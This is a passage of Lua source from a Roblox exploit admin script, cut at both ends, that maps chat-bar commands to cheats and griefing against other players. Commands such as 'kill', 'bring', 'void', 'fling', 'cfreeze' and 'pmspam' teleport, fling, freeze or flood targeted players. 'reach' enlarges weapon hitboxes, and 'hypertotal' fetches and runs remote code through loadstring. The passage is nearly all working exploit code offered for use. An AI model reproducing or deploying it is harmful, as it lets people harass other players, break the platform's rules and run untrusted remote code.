				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..pmspammed.." @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@", "All")
			end
		end
	end)
	spawn(function()
		while wait() do
			if cbring == true then
				tp()
			end
		end
	end)
	spawn(function()
		while wait() do
			if cbringall == true then
				tpall()
			end
		end
	end)

	Mouse.KeyDown:connect(function(Key)
		if Key == prefix then
			CMDBAR:CaptureFocus()
		end
	end)

	CMDBAR.FocusLost:connect(function(enterPressed)
		if enterPressed then
			if string.sub(CMDBAR.Text, 1, 5) == ("kill ") then
				if string.sub(CMDBAR.Text, 6) == "me" then
					lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(100000,0,100000)
				else
					for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6)))do
						local NOW = lplayer.Character.HumanoidRootPart.CFrame
						lplayer.Character.Humanoid.Name = 1
						local l = lplayer.Character["1"]:Clone()
						l.Parent = lplayer.Character
						l.Name = "Humanoid"
						wait(0.1)
						lplayer.Character["1"]:Destroy()
						game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
						lplayer.Character.Animate.Disabled = true
						wait(0.1)
						lplayer.Character.Animate.Disabled = false
						lplayer.Character.Humanoid.DisplayDistanceType = "None"
						for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
							lplayer.Character.Humanoid:EquipTool(v)
						end
						local function tp(player,player2)
							local char1,char2=player.Character,player2.Character
							if char1 and char2 then
								char1:MoveTo(char2.Head.Position)
							end
						end
						wait(0.1)
						lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
						wait(0.2)
						lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
						wait(0.5)
						lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
						wait(0.7)
						tp(lplayer,game:GetService("Players")[v.Name])
						wait(0.7)
						lplayer.Character.HumanoidRootPart.CFrame = NOW
						game:GetService("StarterGui"):SetCore("SendNotification", {
							Title = "Tools needed!";
							Text = "You need a tool in your backpack for this command!";
						})
					end
				end
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("bring ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7)))do
					local NOW = lplayer.Character.HumanoidRootPart.CFrame
					lplayer.Character.Humanoid.Name = 1
					local l = lplayer.Character["1"]:Clone()
					l.Parent = lplayer.Character
					l.Name = "Humanoid"
					wait(0.1)
					lplayer.Character["1"]:Destroy()
					game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
					lplayer.Character.Animate.Disabled = true
					wait(0.1)
					lplayer.Character.Animate.Disabled = false
					lplayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						lplayer.Character.Humanoid:EquipTool(v)
					end
					local function tp(player,player2)
						local char1,char2=player.Character,player2.Character
						if char1 and char2 then
							char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
						end
					end
					local function getout(player,player2)
						local char1,char2=player.Character,player2.Character
						if char1 and char2 then
							char1:MoveTo(char2.Head.Position)
						end
					end
					tp(game:GetService("Players")[v.Name], lplayer)
					wait(0.2)
					tp(game:GetService("Players")[v.Name], lplayer)
					wait(0.5)
					lplayer.Character.HumanoidRootPart.CFrame = NOW
					wait(0.5)
					getout(lplayer, game:GetService("Players")[v.Name])
					wait(0.3)
					lplayer.Character.HumanoidRootPart.CFrame = NOW
					game:GetService("StarterGui"):SetCore("SendNotification", {
						Title = "Tools needed!";
						Text = "You need a tool in your backpack for this command!";
					})
				end
			end
			if string.sub(CMDBAR.Text, 1, 5) == ("spin ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
					lplayer.Character.Humanoid.Name = 1
					local l = lplayer.Character["1"]:Clone()
					l.Parent = lplayer.Character
					l.Name = "Humanoid"
					wait(0.1)
					lplayer.Character["1"]:Destroy()
					game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
					lplayer.Character.Animate.Disabled = true
					wait(0.1)
					lplayer.Character.Animate.Disabled = false
					lplayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						lplayer.Character.Humanoid:EquipTool(v)
					end
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
					spinplr = v
					wait(0.5)
					spin = true
					game:GetService("StarterGui"):SetCore("SendNotification", {
						Title = "Tools needed!";
						Text = "You need a tool in your backpack for this command!";
					})
				end
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("unspin") then
				spin = false
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("attach ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
					lplayer.Character.Humanoid.Name = 1
					local l = lplayer.Character["1"]:Clone()
					l.Parent = lplayer.Character
					l.Name = "Humanoid"
					wait(0.1)
					lplayer.Character["1"]:Destroy()
					game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
					lplayer.Character.Animate.Disabled = true
					wait(0.1)
					lplayer.Character.Animate.Disabled = false
					lplayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						lplayer.Character.Humanoid:EquipTool(v)
					end
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
					wait(0.3)
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
					attplr = v
					game:GetService("StarterGui"):SetCore("SendNotification", {
						Title = "Tools needed!";
						Text = "You need a tool in your backpack for this command!";
					})
				end
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("unattach ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
					local function getout(player,player2)
						local char1,char2=player.Character,player2.Character
						if char1 and char2 then
							char1:MoveTo(char2.Head.Position)
						end
					end
					getout(lplayer, game:GetService("Players")[v.Name])
				end
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("follow ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
					followed = true
					flwplr = v
				end
			end
			if string.sub(CMDBAR.Text, 1, 8) == ("unfollow") then
				followed = false
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("freefall ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
					local NOW = lplayer.Character.HumanoidRootPart.CFrame
					lplayer.Character.Humanoid.Name = 1
					local l = lplayer.Character["1"]:Clone()
					l.Parent = lplayer.Character
					l.Name = "Humanoid"
					wait(0.1)
					lplayer.Character["1"]:Destroy()
					game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
					lplayer.Character.Animate.Disabled = true
					wait(0.1)
					lplayer.Character.Animate.Disabled = false
					lplayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						lplayer.Character.Humanoid:EquipTool(v)
					end
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
					wait(0.2)
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
					wait(0.6)
					lplayer.Character.HumanoidRootPart.CFrame = NOW
					wait(0.6)
					lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,50000,0)
					game:GetService("StarterGui"):SetCore("SendNotification", {
						Title = "Tools needed!";
						Text = "You need a tool in your backpack for this command!";
					})
				end
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("trail ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
					traill = true
					trlplr = v
				end
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("untrail") then
				traill = false
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("orbit ") then
				if string.sub(CMDBAR.Text, 7) == "all" or string.sub(CMDBAR.Text, 7) == "others" or string.sub(CMDBAR.Text, 7) == "me" then
					lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
				else
					for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
						local o = Instance.new("RocketPropulsion")
						o.Parent = lplayer.Character.HumanoidRootPart
						o.Name = "Orbit"
						o.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
						o:Fire()
						noclip = true
					end
				end
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("unorbit") then
				lplayer.Character.HumanoidRootPart.Orbit:Destroy()
				noclip = false
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("fling ") then
				if string.sub(CMDBAR.Text, 7) == "all" or string.sub(CMDBAR.Text, 7) == "others" or string.sub(CMDBAR.Text, 7) == "me" then
					lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
				else
					for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
						local y = Instance.new("RocketPropulsion")
						y.Parent = lplayer.Character.HumanoidRootPart
						y.CartoonFactor = 1
						y.MaxThrust = 800000
						y.MaxSpeed = 1000
						y.ThrustP = 200000
						y.Name = "Fling"
						game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
						y.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
						y:Fire()
						noclip = true
					end
				end
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("unfling") then
				noclip = false
				lplayer.Character.HumanoidRootPart.Fling:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
				wait(0.4)
				lplayer.Character.HumanoidRootPart.Fling:Destroy()
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("fecheck") then
				if game:GetService("Workspace").FilteringEnabled == true then
					warn("FE is Enabled (Filtering Enabled)")
					game:GetService("StarterGui"):SetCore("SendNotification", {
						Title = "FE is Enabled";
						Text = "Filtering Enabled. Enjoy using Reviz Admin!";
					})
				else
					warn("FE is Disabled (Filtering Disabled) Consider using a different admin script.")
					game:GetService("StarterGui"):SetCore("SendNotification", {
						Title = "FE is Disabled";
						Text = "Filtering Disabled. Consider using a different admin script.";
					})
				end
			end
			if string.sub(CMDBAR.Text, 1, 5) == ("void ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
					lplayer.Character.Humanoid.Name = 1
					local l = lplayer.Character["1"]:Clone()
					l.Parent = lplayer.Character
					l.Name = "Humanoid"
					wait(0.1)
					lplayer.Character["1"]:Destroy()
					game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
					lplayer.Character.Animate.Disabled = true
					wait(0.1)
					lplayer.Character.Animate.Disabled = false
					lplayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						lplayer.Character.Humanoid:EquipTool(v)
					end
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
					wait(0.2)
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
					wait(0.6)
					lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999999999,0,999999999999999)
					game:GetService("StarterGui"):SetCore("SendNotification", {
						Title = "Tools needed!";
						Text = "You need a tool in your backpack for this command!";
					})
				end
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("noclip") then
				noclip = true
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Noclip enabled";
					Text = "Type ;clip to disable";
				})
			end
			if string.sub(CMDBAR.Text, 1, 4) == ("clip") then
				noclip = false
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Noclip disabled";
					Text = "Type ;noclip to enable";
				})
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("speed ") then
				lplayer.Character.Humanoid.WalkSpeed = (string.sub(CMDBAR.Text, 7))
			end
			if string.sub(CMDBAR.Text, 1, 3) == ("ws ") then
				lplayer.Character.Humanoid.WalkSpeed = (string.sub(CMDBAR.Text, 4))
			end
			if string.sub(CMDBAR.Text, 1, 10) == ("hipheight ") then
				lplayer.Character.Humanoid.HipHeight = (string.sub(CMDBAR.Text, 11))
			end
			if string.sub(CMDBAR.Text, 1, 3) == ("hh ") then
				lplayer.Character.Humanoid.HipHeight = (string.sub(CMDBAR.Text, 4))
			end
			if string.sub(CMDBAR.Text, 1, 10) == ("jumppower ") then
				lplayer.Character.Humanoid.JumpPower = (string.sub(CMDBAR.Text, 11))
			end
			if string.sub(CMDBAR.Text, 1, 3) == ("jp ") then
				lplayer.Character.Humanoid.JumpPower = (string.sub(CMDBAR.Text, 4))
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("default") then
				lplayer.Character.Humanoid.JumpPower = 50
				lplayer.Character.Humanoid.WalkSpeed = 16
				lplayer.Character.Humanoid.HipHeight = 0
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("annoy ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
					annoying = true
					annplr = v
				end
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("unannoy") then
				annoying = false
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("headwalk ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
					hwalk = true
					hdwplr = v
				end
			end
			if string.sub(CMDBAR.Text, 1, 10) == ("unheadwalk") then
				hwalk = false
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("nolimbs") then
				lplayer.Character["Left Leg"]:Destroy()
				lplayer.Character["Left Arm"]:Destroy()
				lplayer.Character["Right Leg"]:Destroy()
				lplayer.Character["Right Arm"]:Destroy()
			end
			if string.sub(CMDBAR.Text, 1, 3) == ("god") then
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "FE Godmode enabled";
					Text = "Use ;grespawn or ;respawn to remove.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 8) == ("drophats") then
				for i,v in pairs(lplayer.Character:GetChildren()) do
					if (v:IsA("Accessory")) or (v:IsA("Hat")) then
						v.Parent = workspace
					end
				end
			end
			if string.sub(CMDBAR.Text, 1, 8) == ("droptool") then
				for i,v in pairs(lplayer.Character:GetChildren()) do
					if (v:IsA("Tool")) then
						v.Parent = workspace
					end
				end
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("loopdhats") then
				droppinghats = true
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Loop Drop Enabled";
					Text = "Type ;unloopdhats to disable";
				})
			end
			if string.sub(CMDBAR.Text, 1, 11) == ("unloopdhats") then
				droppinghats = false
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Loop Drop Disabled";
					Text = "Type ;loopdhats to enable.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("loopdtool") then
				droppingtools = true
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Loop Drop Enabled";
					Text = "Type ;unloopdtool to disable";
				})
			end
			if string.sub(CMDBAR.Text, 1, 11) == ("unloopdtool") then
				droppingtools = false
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Loop Drop Disabled";
					Text = "Type ;loopdtool to enable.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("invisible") then -- Credit to Timeless
				Local = game:GetService('Players').LocalPlayer
				Char  = Local.Character
				touched,tpdback = false, false
				box = Instance.new('Part',workspace)
				box.Anchored = true
				box.CanCollide = true
				box.Size = Vector3.new(10,1,10)
				box.Position = Vector3.new(0,10000,0)
				box.Touched:connect(function(part)
					if (part.Parent.Name == Local.Name) then
						if touched == false then
							touched = true
							function apply()
								if script.Disabled ~= true then
									no = Char.HumanoidRootPart:Clone()
									wait(.25)
									Char.HumanoidRootPart:Destroy()
									no.Parent = Char
									Char:MoveTo(loc)
									touched = false
								end end
							if Char then
								apply()
							end
						end
					end
				end)
				repeat wait() until Char
				loc = Char.HumanoidRootPart.Position
				Char:MoveTo(box.Position + Vector3.new(0,.5,0))
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Invisibility enabled!";
					Text = "Reset or use ;respawn to remove.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 5) == ("view ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
					if game:GetService("Players")[v.Name].Character.Humanoid then
						game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Humanoid
					else
						game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
					end
				end
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("unview") then
				if lplayer.Character.Humanoid then
					game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
				else
					game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
				end
			end
			if string.sub(CMDBAR.Text, 1, 5) == ("goto ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				end
			end
			if string.sub(CMDBAR.Text, 1, 3) == ("fly") then
				repeat wait() until lplayer and lplayer.Character and lplayer.Character:FindFirstChild('HumanoidRootPart') and lplayer.Character:FindFirstChild('Humanoid')
				repeat wait() until Mouse

				local T = lplayer.Character.HumanoidRootPart
				local CONTROL = {F = 0, B = 0, L = 0, R = 0}
				local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
				local SPEED = speedget

				local function fly()
					flying = true
					local BG = Instance.new('BodyGyro', T)
					local BV = Instance.new('BodyVelocity', T)
					BG.P = 9e4
					BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
					BG.cframe = T.CFrame
					BV.velocity = Vector3.new(0, 0.1, 0)
					BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
					spawn(function()
						repeat wait()
							lplayer.Character.Humanoid.PlatformStand = true
							if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
								SPEED = 50
							elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
								SPEED = 0
							end
							if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
								BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
								lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
							elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
								BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
							else
								BV.velocity = Vector3.new(0, 0.1, 0)
							end
							BG.cframe = workspace.CurrentCamera.CoordinateFrame
						until not flying
						CONTROL = {F = 0, B = 0, L = 0, R = 0}
						lCONTROL = {F = 0, B = 0, L = 0, R = 0}
						SPEED = 0
						BG:destroy()
						BV:destroy()
						lplayer.Character.Humanoid.PlatformStand = false
					end)
				end
				Mouse.KeyDown:connect(function(KEY)
					if KEY:lower() == 'w' then
						CONTROL.F = speedfly
					elseif KEY:lower() == 's' then
						CONTROL.B = -speedfly
					elseif KEY:lower() == 'a' then
						CONTROL.L = -speedfly 
					elseif KEY:lower() == 'd' then 
						CONTROL.R = speedfly
					end
				end)
				Mouse.KeyUp:connect(function(KEY)
					if KEY:lower() == 'w' then
						CONTROL.F = 0
					elseif KEY:lower() == 's' then
						CONTROL.B = 0
					elseif KEY:lower() == 'a' then
						CONTROL.L = 0
					elseif KEY:lower() == 'd' then
						CONTROL.R = 0
					end
				end)
				fly()
			end
			if string.sub(CMDBAR.Text, 1, 5) == ("unfly") then
				flying = false
				lplayer.Character.Humanoid.PlatformStand = false
			end
			if string.sub(CMDBAR.Text, 1, 5) == ("chat ") then
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer((string.sub(CMDBAR.Text, 6)), "All")
			end
			if string.sub(CMDBAR.Text, 1, 5) == ("spam ") then
				spamtext = (string.sub(CMDBAR.Text, 6))
				spamming = true
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("unspam") then
				spamming = false
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("spamwait ") then
				spamdelay = (string.sub(CMDBAR.Text, 10))
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("pmspam ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
					pmspammed = v.Name
					spammingpm = true
				end
			end
			if string.sub(CMDBAR.Text, 1, 8) == ("unpmspam") then
				spammingpm = false
			end
			if string.sub(CMDBAR.Text, 1, 8) == ("cfreeze ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 9))) do
					v.Character["Left Leg"].Anchored = true
					v.Character["Left Arm"].Anchored = true
					v.Character["Right Leg"].Anchored = true
					v.Character["Right Arm"].Anchored = true
					v.Character.Torso.Anchored = true
					v.Character.Head.Anchored = true
				end
			end
			if string.sub(CMDBAR.Text, 1, 10) == ("uncfreeze ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 11))) do
					v.Character["Left Leg"].Anchored = false
					v.Character["Left Arm"].Anchored = false
					v.Character["Right Leg"].Anchored = false
					v.Character["Right Arm"].Anchored = false
					v.Character.Torso.Anchored = false
					v.Character.Head.Anchored = false
				end
			end
			if string.sub(CMDBAR.Text, 1, 8) == ("unlockws") then
				local a = game:GetService("Workspace"):getChildren()
				for i = 1, #a do
					if a[i].className == "Part" then
						a[i].Locked = false
					elseif a[i].className == "Model" then
						local r = a[i]:getChildren()
						for i = 1, #r do
							if r[i].className == "Part" then
								r[i].Locked = false
							end
						end
					end
				end
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Success!";
					Text = "Workspace unlocked. Use ;lockws to lock.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("lockws") then
				local a = game:GetService("Workspace"):getChildren()
				for i = 1, #a do
					if a[i].className == "Part" then
						a[i].Locked = true
					elseif a[i].className == "Model" then
						local r = a[i]:getChildren()
						for i = 1, #r do
							if r[i].className == "Part" then
								r[i].Locked = true
							end
						end
					end
				end
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("btools") then
				local Clone_T = Instance.new("HopperBin",lplayer.Backpack)
				Clone_T.BinType = "Clone"
				local Destruct = Instance.new("HopperBin",lplayer.Backpack)
				Destruct.BinType = "Hammer"
				local Hold_T = Instance.new("HopperBin",lplayer.Backpack)
				Hold_T.BinType = "Grab"
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("pstand") then
				lplayer.Character.Humanoid.PlatformStand = true
			end
			if string.sub(CMDBAR.Text, 1, 8) == ("unpstand") then
				lplayer.Character.Humanoid.PlatformStand = false
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("blockhead") then
				lplayer.Character.Head.Mesh:Destroy()
			end
			if string.sub(CMDBAR.Text, 1, 3) == ("sit") then
				lplayer.Character.Humanoid.Sit = true
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("bringobj ") then
				local function bringobjw()
					for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
						if obj.Name == (string.sub(CMDBAR.Text, 10)) then
							obj.CFrame = lplayer.Character.HumanoidRootPart.CFrame
							obj.CanCollide = false
							obj.Transparency = 0.7
							wait()
							obj.CFrame = lplayer.Character["Left Leg"].CFrame
							wait()
							obj.CFrame = lplayer.Character["Right Leg"].CFrame
							wait()
							obj.CFrame = lplayer.Character["Head"].CFrame
						end
					end
				end
				while wait() do
					bringobjw()
				end
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "BringObj";
					Text = "BringObj enabled.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("wsvis ") then
				vis = (string.sub(CMDBAR.Text, 7))
				local a = game:GetService("Workspace"):GetDescendants()
				for i = 1, #a do
					if a[i].className == "Part" then
						a[i].Transparency = vis
					elseif a[i].className == "Model" then
						local r = a[i]:getChildren()
						for i = 1, #r do
							if r[i].className == "Part" then
								r[i].Transparency = vis
							end
						end
					end
				end
			end
			if string.sub(CMDBAR.Text, 1, 10) == ("hypertotal") then
				loadstring(game:GetObjects("rbxassetid://1255063809")[1].Source)()
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Success!";
					Text = "HyperTotal GUI Loaded!";
				})
			end
			if string.sub(CMDBAR.Text, 1, 4) == ("cmds") then
				CMDSFRAME.Visible = true
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("rmeshhats") then
				for i,v in pairs(lplayer.Character:GetChildren()) do
					if (v:IsA("Accessory")) or (v:IsA("Hat")) then
						v.Handle.Mesh:Destroy()
					end
				end
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("blockhats") then
				for i,v in pairs(lplayer.Character:GetChildren()) do
					if (v:IsA("Accessory")) or (v:IsA("Hat")) then
						v.Handle.Mesh:Destroy()
					end
				end
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("rmeshtool") then
				for i,v in pairs(lplayer.Character:GetChildren()) do
					if (v:IsA("Tool")) then
						v.Handle.Mesh:Destroy()
					end
				end
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("blocktool") then
				for i,v in pairs(lplayer.Character:GetChildren()) do
					if (v:IsA("Tool")) then
						v.Handle.Mesh:Destroy()
					end
				end
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("spinner") then
				local p = Instance.new("RocketPropulsion")
				p.Parent = lplayer.Character.HumanoidRootPart
				p.Name = "Spinner"
				p.Target = lplayer.Character["Left Arm"]
				p:Fire()
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Spinner enabled";
					Text = "Type ;nospinner to disable.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 9) == ("nospinner") then
				lplayer.Character.HumanoidRootPart.Spinner:Destroy()
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("reachd") then
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
					if v:isA("Tool") then
						local a = Instance.new("SelectionBox",v.Handle)
						a.Adornee = v.Handle
						v.Handle.Size = Vector3.new(0.5,0.5,60)
						v.GripPos = Vector3.new(0,0,0)
						lplayer.Character.Humanoid:UnequipTools()
					end
				end
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Reach applied!";
					Text = "Applied to equipped sword. Use ;noreach to disable.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("reach ") then
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
					if v:isA("Tool") then
						local a = Instance.new("SelectionBox",v.Handle)
						a.Name = "Reach"
						a.Adornee = v.Handle
						v.Handle.Size = Vector3.new(0.5,0.5,(string.sub(CMDBAR.Text, 7)))
						v.GripPos = Vector3.new(0,0,0)
						lplayer.Character.Humanoid:UnequipTools()
					end
				end
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Reach applied!";
					Text = "Applied to equipped sword. Use ;noreach to disable.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 7) == ("noreach") then
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
					if v:isA("Tool") then
						v.Handle.Reach:Destroy()
					end
				end
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Reach removed!";
					Text = "Removed reach from equipped sword.";
				})
			end
			if string.sub(CMDBAR.Text, 1, 6) == ("rkill ") then
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7)))do
					lplayer.Character.Humanoid.Name = 1
					local l = lplayer.Character["1"]:Clone()
					l.Parent = lplayer.Character
					l.Name = "Humanoid"
					wait(0.1)
					lplayer.Character["1"]:Destroy()
					game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
					lplayer.Character.Animate.Disabled = true
					wait(0.1)
					lplayer.Character.Animate.Disabled = false
					lplayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						lplayer.Character.Humanoid:EquipTool(v)
					end
					wait(0.1)
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
					wait(0.2)
					lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
					wait(0.5)
